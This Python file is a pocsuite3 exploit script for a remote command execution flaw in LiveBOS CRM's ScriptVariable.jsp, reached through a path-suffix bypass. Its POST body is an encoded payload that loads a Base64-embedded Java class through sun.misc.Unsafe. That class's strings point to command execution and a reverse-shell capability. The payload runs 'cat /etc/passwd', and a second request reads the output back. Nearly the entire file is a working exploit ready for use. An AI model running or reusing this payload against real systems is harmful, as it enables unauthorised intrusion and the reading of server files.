# -*- coding: utf-8 -*-
# 2023/12/17

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OrderedDict, OptString


class livebos_crm_scriptvariable_RCE(POCBase):
    author = '炼金术师诸葛亮'
    createDate = '2023-12-17'
    name = 'livebos_crm_scriptvariable_RCE'
    appName = 'livebos_crm_scriptvariable_RCE'
    vulType = 'Command Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = 'livebos crm scriptvariable.jsp 远程命令执行'  # 漏洞简要描述

    def _verify(self):
        result = {}
        path = "/plug-in/common/ScriptVariable.jsp;.css.jsp"  # 参数
        url = self.url + path
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
            'Accept-Encoding': 'gzip',
            'Connection': 'close'
        }
        data='act=put&scope=0&name=gName13&value=bytes%3Djava.lang.Class.forName%28%22org.apache.commons.codec.binary.Base64%22%29.newInstance%28%29.decode%28%22yv66vgAAADEA5AoATgBcCABdCgAcAF4IAF8KABwAYAgAYQoAHABiCgAcAGMIAGQKABwAZQgAZgoAZwBoCgBNAGkIAGoKAE0AawgAbAoAbQBuCgAcAG8IAHAKABwAcQgAcggAcwcAdAoAFwBcCgAXAHUIAHYKABcAdwcAeAgAeQgAeggAewgAfAgAfQoAfgB%2FCgB%2BAIAHAIEKAIIAgwoAJACECACFCgAkAIYKACQAhwoAJACICgCCAIkKAIIAigcAiwoALQB3CACMCgAcAI0IAI4KAH4AjwcAkAoAZwCRCgAzAJIKADMAgwoAggCTCgAzAJMKADMAlAoAlQCWCgCVAJcKAJgAmQoAmACaBQAAAAAAAAAyCgCbAJwKAIIAnQoAMwCeCACfCgAtAKAIAKEIAKIHAKMKAEcAjQoAHACkCgBHAKUKAEcAmggApgcApwcAqAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdleGVjdXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARleGVjAQAHcmV2ZXJzZQEAOShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0ludGVnZXI7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAHQzEuamF2YQwATwBQAQAADACpAKoBABBjb21tYW5kIG5vdCBudWxsDACrAKwBAAUjIyMjIwwArQCuDACvALABAAE6DACxALIBACJjb21tYW5kIHJldmVyc2UgaG9zdCBmb3JtYXQgZXJyb3IhBwCzDAC0ALUMAFYAVwEABUBAQEBADABVAFQBAAdvcy5uYW1lBwC2DAC3AFQMALgArAEAA3dpbgwAuQC6AQAEcGluZwEAAi1uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMALsAvAEABSAtbiA0DAC9AKwBABBqYXZhL2xhbmcvU3RyaW5nAQADY21kAQACL2MBAAUgLXQgNAEAAnNoAQACLWMHAL4MAL8AwAwAVQDBAQARamF2YS91dGlsL1NjYW5uZXIHAMIMAMMAxAwATwDFAQACXGEMAMYAxwwAyADJDADKAKwMAMsAxAwAzABQAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABy9iaW4vc2gMAE8AzQEAB2NtZC5leGUMAFUAzgEAD2phdmEvbmV0L1NvY2tldAwAzwDQDABPANEMANIA0wwA1ADJBwDVDADWANAMANcA0AcA2AwAWADZDADaAFAHANsMANwA3QwA3gDQDADfAFABAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwA4ACsAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEBABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MAOEA4gwAWADjAQACb2sBAAJDMQEAEGphdmEvbGFuZy9PYmplY3QBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAR0cmltAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvSW50ZWdlcgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvSW50ZWdlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAA5nZXRFcnJvclN0cmVhbQEAB2Rlc3Ryb3kBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAAhpbnRWYWx1ZQEAAygpSQEAFihMamF2YS9sYW5nL1N0cmluZztJKVYBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAhpc0Nsb3NlZAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAlhdmFpbGFibGUBAARyZWFkAQAUamF2YS9pby9PdXRwdXRTdHJlYW0BAAQoSSlWAQAFZmx1c2gBABBqYXZhL2xhbmcvVGhyZWFkAQAFc2xlZXABAAQoSilWAQAJZXhpdFZhbHVlAQAFY2xvc2UBAApnZXRNZXNzYWdlAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAFKFtCKVYAIQBNAE4AAAAAAAUAAQBPAFAAAQBRAAAAHQABAAEAAAAFKrcAAbEAAAABAFIAAAAGAAEAAAANAAEAUwBUAAEAUQAAAI8ABAADAAAAVyvGAAwSAiu2AAOZAAYSBLArtgAFTCsSBrYAB5kAKCsSBhICtgAIEgm2AApNLL4FnwAGEguwKiwDMiwEMrgADLYADbAqKxIGEgK2AAgSDhICtgAItgAPsAAAAAEAUgAAACYACQAAABUADQAWABAAGAAVABkAHgAbACwAHAAyAB0ANQAfAEMAIQABAFUAVAABAFEAAAHOAAQACQAAASoSELgAEbYAEk0rtgAFTAFOAToELBITtgAUmQBAKxIVtgAUmQAgKxIWtgAUmgAXuwAXWbcAGCu2ABkSGrYAGbYAG0wGvQAcWQMSHVNZBBIeU1kFK1M6BKcAPSsSFbYAFJkAICsSFrYAFJoAF7sAF1m3ABgrtgAZEh%2B2ABm2ABtMBr0AHFkDEiBTWQQSIVNZBStTOgS4ACIZBLYAI067ACRZLbYAJbcAJhIntgAoOgUZBbYAKZkACxkFtgAqpwAFEgI6BrsAJFkttgArtwAmEie2ACg6BbsAF1m3ABgZBrYAGRkFtgApmQALGQW2ACqnAAUSArYAGbYAGzoGGQY6By3GAActtgAsGQewOgUZBbYALjoGLcYABy22ACwZBrA6CC3GAActtgAsGQi%2FAAQAkwD%2BAQkALQCTAP4BHQAAAQkBEgEdAAABHQEfAR0AAAABAFIAAAByABwAAAAlAAkAJgAOACcAEAAoABMAKQAcACoALgArAEIALQBZAC8AawAwAH8AMgCTADUAnAA2AK4ANwDCADgA1AA5APoAOgD%2BAD4BAgA%2FAQYAOgEJADsBCwA8ARIAPgEWAD8BGgA8AR0APgEjAD8BJwBBAAEAVgBXAAEAUQAAAYMABAAMAAAA8xIQuAARtgASEhO2ABSaABC7ABxZEi%2B3ADBOpwANuwAcWRIxtwAwTrgAIi22ADI6BLsAM1krLLYANLcANToFGQS2ACU6BhkEtgArOgcZBbYANjoIGQS2ADc6CRkFtgA4OgoZBbYAOZoAYBkGtgA6ngAQGQoZBrYAO7YAPKf%2F7hkHtgA6ngAQGQoZB7YAO7YAPKf%2F7hkItgA6ngAQGQkZCLYAO7YAPKf%2F7hkKtgA9GQm2AD0UAD64AEAZBLYAQVenAAg6C6f%2FnhkEtgAsGQW2AEKnACBOuwAXWbcAGBJDtgAZLbYARLYAGRJFtgAZtgAbsBJGsAACALgAvgDBAC0AAADQANMALQABAFIAAABuABsAAABNABAATgAdAFAAJwBSADAAUwA%2BAFQAUwBVAGEAVgBpAFcAcQBYAH4AWgCGAFsAkwBdAJsAXgCoAGAArQBhALIAYgC4AGQAvgBlAMEAZgDDAGcAxgBpAMsAagDQAG0A0wBrANQAbADwAG4AAQBYAFkAAQBRAAAAWQADAAQAAAAhuwBHWSu3AEhOLSy2AEm2AEottgBLpwAJTi22AC6wEkywAAEAAAAVABgALQABAFIAAAAeAAcAAAB5AAkAegARAHsAFQB%2BABgAfAAZAH0AHgB%2FAAEAWgAAAAIAWw%3D%3D%22%29%3BtheUnsafeMethod%3Djava.lang.Class.forName%28%22sun.misc.Unsafe%22%29.getDeclaredField%28%22theUnsafe%22%29%3BtheUnsafeMethod.setAccessible%28true%29%3Bunsafe%3DtheUnsafeMethod.get%28null%29%3BclassLoader%3Dnew+java.net.URLClassLoader%28java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.net.URL%22%29%2C+0%29%29%3BprotectionDomain%3Dnew+java.security.ProtectionDomain%28new+java.security.CodeSource%28null%2C+java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.security.cert.Certificate%22%29%2C+0%29%29%2C+null%2C+classLoader%2C+%5B%5D%29%3Bclz+%3D+unsafe.defineClass%28null%2C+bytes%2C+0%2C+bytes.length%2C+classLoader%2C+protectionDomain%29%3Bj%3Dclz.newInstance%28%29.exec%28%22cat /etc/passwd%22%29%2B%22%22%3B'
        r = requests.post(url,headers=headers,data=data)
        print(r.text)
        # 验证成功输出相关信息
        if r.status_code == 200 and 'true' in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = "/plug-in/common/ScriptVariable.jsp;.css.jsp"
        url = self.url + path
        headers2={
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip',
            'Connection': 'close'
        }
        data2='act=get&scope=0&name=gName13'

        r = requests.post(url,headers=headers2,data=data2)
        if r and r.status_code == 200 and "root" in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)

register_poc(livebos_crm_scriptvariable_RCE)